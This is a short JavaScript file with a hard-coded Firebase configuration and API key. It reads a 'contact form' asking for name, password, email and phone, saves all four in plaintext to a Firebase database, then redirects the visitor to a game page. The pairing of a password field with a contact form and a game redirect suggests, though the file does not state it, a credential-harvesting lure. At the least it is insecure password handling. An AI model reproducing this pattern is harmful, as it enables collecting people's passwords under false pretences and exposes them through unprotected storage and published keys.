


const firebaseConfig = {
  apiKey: "AIzaSyAbosl6Gn3kRnhrDmtucQR0AQ9SD2a0Twg",
  authDomain: "forms-9d492.firebaseapp.com",
  databaseURL: "https://forms-9d492-default-rtdb.firebaseio.com",
  projectId: "forms-9d492",
  storageBucket: "forms-9d492.appspot.com",
  messagingSenderId: "614070645009",
  appId: "1:614070645009:web:e6068da4d0ad7598ff5cb0"
};

 // Initialize Firebase
 firebase.initializeApp(firebaseConfig);

 
  // Reference messages collection
  var messagesRef = firebase.database().ref('messages');
  
  // Listen for form submit
  document.getElementById('contactForm').addEventListener('submit', submitForm);
  
  // Submit form
  function submitForm(e){
    e.preventDefault();
  
    // Get values
    var name = getInputVal('name');
    var password = getInputVal('password');
    var email = getInputVal('email');
    var phone = getInputVal('phone');
    // var message = getInputVal('message');
  
    // Save message
    saveMessage(name, email, phone, password);
  
    // Show alert
    document.querySelector('.alert').style.display = 'block';
  
    // Hide alert after 3 seconds
    setTimeout(function(){
      document.querySelector('.alert').style.display = 'none';
    },3000);
  
    // Clear form
    document.getElementById('contactForm').reset();

    setTimeout(function(){
        window.location.assign("game.html");
      },5000);
    
   
  }
  
  // Function to get get form values
  function getInputVal(id){
    return document.getElementById(id).value;
  }
  
  // Save message to firebase
  function saveMessage(name, email, phone ,password){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
      name:name,
      password:password,
      email:email,
      phone:phone,
      // message:message
    });
  }